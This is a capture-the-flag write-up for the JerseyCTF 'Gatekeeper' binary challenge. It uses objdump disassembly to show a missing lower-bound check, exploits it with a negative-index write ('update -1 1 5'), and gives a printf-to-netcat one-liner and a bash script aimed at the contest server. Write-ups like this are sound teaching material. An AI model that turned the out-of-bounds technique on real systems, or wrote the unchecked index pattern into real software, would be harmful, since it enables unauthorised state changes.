# Gatekeeper — JerseyCTF Writeup

**Challenge:** Gatekeeper  
**Category:** bin  
**Difficulty:** Medium  
**Points:** 735  
**Solves:** 31  
**Author:** Trent  
**Writeup by:** zham  
**Flag:** `JCTF{N3PTUN3_G4T3_AUTH0R1Z3D}`

---

## Description

> A degraded certificate authority once managed planetary gate transit across Orion's inner routes. Neptune remains locked, and only legacy certificates seem to matter now. Find a way to authorize Neptune transit and restore the first hop in the surviving gate chain. An offline analysis copy is provided, but the real gate is online at `gatekeeper.aws.jerseyctf.com`.
>
> `nc gatekeeper.aws.jerseyctf.com 31337`

**Attachment:** `05-gatekeeper.zip`

---

## Background Knowledge (Read This First!)

### What is binary exploitation?

**Binary exploitation** (also called "pwn") involves finding and abusing bugs in compiled programs to make them do something they were not designed to do. Common bug classes include buffer overflows, format string vulnerabilities, use-after-free, and **array index out-of-bounds** — which is what this challenge uses.

### What is an array index out-of-bounds write?

In C, an array is just a block of memory. When you access `array[i]`, the computer calculates:
```
address = base_address_of_array + i × element_size
```

If the programmer only checks `i < MAX` but never checks `i >= 0`, then a **negative index** steps *backwards* in memory from the array — into adjacent data structures. This is an out-of-bounds write, and it can overwrite fields that were never meant to be modified.

### What is `objdump`?

**objdump** is a Linux tool that disassembles compiled binaries into human-readable assembly code. It lets you read the logic of a program without having the source code, which is essential for understanding how validation checks are implemented.

---

## Solution — Step by Step

### Step 1 — Inventory the files

```
┌──(zham㉿kali)-[~]
└─$ unzip -l 05-gatekeeper.zip
Archive: 05-gatekeeper.zip
  gatekeeper_offline    ← ELF 64-bit binary (offline analysis copy)
  gate_route_notice.txt ← lore / context
  README.txt            ← live server IP: 44.203.40.136:31337
```

### Step 2 — Interact with the binary to understand its interface

```
┌──(zham㉿kali)-[~]
└─$ chmod +x gatekeeper_offline
┌──(zham㉿kali)-[~]
└─$ ./gatekeeper_offline
Gatekeeper.bin — Certificate Authority (Degraded)
Legacy transit console restored. Type help for commands.
gatekeeper> help
Commands: status, revoke, update
gatekeeper> status NEPT-1070
FOUND: NEPT-1070 valid=0 clearance=5
gatekeeper> status MARS-0214
FOUND: MARS-0214 valid=1 clearance=1
gatekeeper> status JUPI-0428
FOUND: JUPI-0428 valid=1 clearance=2
gatekeeper> status SATU-0642
FOUND: SATU-0642 valid=1 clearance=3
gatekeeper> status URAN-0856
FOUND: URAN-0856 valid=1 clearance=4
```

Five certificates are in the system. Four are valid. **NEPT-1070 is the only one with `valid=0`** — Neptune is locked out.

The `status` command for NEPT-1070 also reveals the win condition: if `valid=1` and `clearance > 4`, the program prints the transit notice and flag.

### Step 3 — Understand the update command

```
gatekeeper> update 0 1 5
UPDATED
gatekeeper> status NEPT-1070
FOUND: NEPT-1070 valid=0 clearance=5
```

`update <INDEX> <VALID> <CLEARANCE>` updates the certificate at position INDEX. But updating index 0 through 3 doesn't seem to affect NEPT-1070. Let's check what index 4 does:

```
gatekeeper> update 4 1 5
DENIED
```

Index 4 is blocked. The binary must have a check that prevents updating the last entry — but what about going the other way?

### Step 4 — Disassemble the update function

Use `objdump` to read the validation logic without source code:

```
┌──(zham㉿kali)-[~]
└─$ objdump -d gatekeeper_offline | grep -A 20 "<cmd_update>"

00000000004014cd <cmd_update>:
  4014cd:  push   %rbp
  ...
  4014de:  cmpl   $0x3,-0x4(%rbp)    ← compare index to 3
  4014e2:  jg     40152e             ← if index > 3, jump to DENIED
  4014e4:  mov    -0x4(%rbp),%eax    ← otherwise, proceed with update
  ...
  40152e:  mov    $0x402173,%edi
  401533:  call   401060 <puts@plt>  ← prints "DENIED"
```

The validation is:
```c
if (index > 3) {
    puts("DENIED");
    return;
}
// otherwise: update cert[index]
```

**Crucially, there is no check for `index < 0`.** Negative indices are never blocked.

### Step 5 — Map out the memory layout

The strings output revealed the cert IDs in order:

```
┌──(zham㉿kali)-[~]
└─$ strings gatekeeper_offline | grep -E "NEPT|MARS|JUPI|SATU|URAN"
NEPT-1070
MARS-0214
JUPI-0428
SATU-0642
URAN-0856
```

The database has this layout (indices 0–3 are MARS, JUPI, SATU, URAN). The assembly shows each struct is 24 bytes (`index × 2 + index = index × 3`, then `<< 3` = multiply by 24). NEPT-1070 sits **immediately before** the start of the array, at index **-1**.

Verify with the update test:
- `update -1 1 5` → writes `valid=1, clearance=5` to the slot before index 0, which is NEPT-1070's slot.

### Step 6 — Exploit locally to confirm

```
┌──(zham㉿kali)-[~]
└─$ printf "update -1 1 5\nstatus NEPT-1070\n" | ./gatekeeper_offline

Gatekeeper.bin — Certificate Authority (Degraded)
Legacy transit console restored. Type help for commands.
gatekeeper> UPDATED
gatekeeper> FOUND: NEPT-1070 valid=1 clearance=5
JCTF{OFFLINE_FAKE_FLAG}
[TRANSIT NOTICE]
NEPTUNE LEGACY CERTIFICATE ACCEPTED
NEXT HOP: URANUS
Sequential gate traversal remains in effect.
Direct inner-system routing remains unavailable.
```

The fake flag confirms the path is correct. The live server substitutes the real flag via the `GATEKEEPER_FLAG` environment variable (visible in the strings output).

### Step 7 — Send the exploit to the live server

```
┌──(zham㉿kali)-[~]
└─$ printf "update -1 1 5\nstatus NEPT-1070\n" | nc gatekeeper.aws.jerseyctf.com 31337

Gatekeeper.bin — Certificate Authority (Degraded)
Legacy transit console restored. Type help for commands.
gatekeeper> UPDATED
gatekeeper> FOUND: NEPT-1070 valid=1 clearance=5
JCTF{N3PTUN3_G4T3_AUTH0R1Z3D}
[TRANSIT NOTICE]
NEPTUNE LEGACY CERTIFICATE ACCEPTED
NEXT HOP: URANUS
Sequential gate traversal remains in effect.
Direct inner-system routing remains unavailable.
gatekeeper>
```

🏁 **Flag: `JCTF{N3PTUN3_G4T3_AUTH0R1Z3D}`**

---

## One-liner Exploit

The exploit is short enough to run directly without a script:

```
┌──(zham㉿kali)-[~]
└─$ printf "update -1 1 5\nstatus NEPT-1070\n" | nc gatekeeper.aws.jerseyctf.com 31337
```

Or if you prefer to save it as a script, open nano:

```
┌──(zham㉿kali)-[~]
└─$ nano exploit.sh
```

Paste the following inside nano:

```bash
#!/bin/bash
printf "update -1 1 5\nstatus NEPT-1070\n" | nc gatekeeper.aws.jerseyctf.com 31337
```

Save and exit nano:

```
Ctrl + O      ← write/save the file
Enter         ← confirm the filename (exploit.sh)
Ctrl + X      ← exit nano
```

Make it executable and run it:

```
┌──(zham㉿kali)-[~]
└─$ chmod +x exploit.sh
┌──(zham㉿kali)-[~]
└─$ ./exploit.sh
Gatekeeper.bin — Certificate Authority (Degraded)
Legacy transit console restored. Type help for commands.
gatekeeper> UPDATED
gatekeeper> FOUND: NEPT-1070 valid=1 clearance=5
JCTF{N3PTUN3_G4T3_AUTH0R1Z3D}
```

---

## Why This Works (Visual Memory Layout)

```
Memory address (low → high):

[NEPT-1070 struct]  ← index -1 (24 bytes before array start)
  +0x00  id string  "NEPT-1070"
  +0x10  valid      0  ← overwritten to 1 by update -1 1 5
  +0x14  clearance  5  ← overwritten to 5 by update -1 1 5

[MARS-0214 struct]  ← index 0  (array base)
[JUPI-0428 struct]  ← index 1
[SATU-0642 struct]  ← index 2
[URAN-0856 struct]  ← index 3

(index 4 = DENIED by the > 3 check)
```

---

## Tools Used

| Tool | Purpose | Level |
|------|---------|-------|
| `strings` | Extract readable strings from binary (cert IDs, flag placeholder) | ⭐ Easy |
| `objdump -d` | Disassemble binary to read the `cmd_update` validation logic | ⭐⭐ Medium |
| `printf \| nc` | Send exploit payload to the live server | ⭐ Easy |
| local binary | Test the exploit safely before sending it live | ⭐ Easy |

---

## Key Takeaways

- **Always test negative indices** — when a program validates `index < MAX` but not `index >= 0`, negative values let you walk backwards through memory. This is one of the first things to try when you see an array-indexed update command.
- **Disassemble before guessing** — `objdump` confirmed the exact check (`jg` = "jump if greater") in seconds, making the vulnerability obvious without any guesswork.
- **Offline binaries are a gift** — always test your exploit on the provided offline copy first. It confirms the logic works and prevents wasting attempts on the live server.
- **Fake flags point the way** — `JCTF{OFFLINE_FAKE_FLAG}` appearing locally is the binary telling you: "yes, this is the right code path." Follow the fake flag to find the real one.
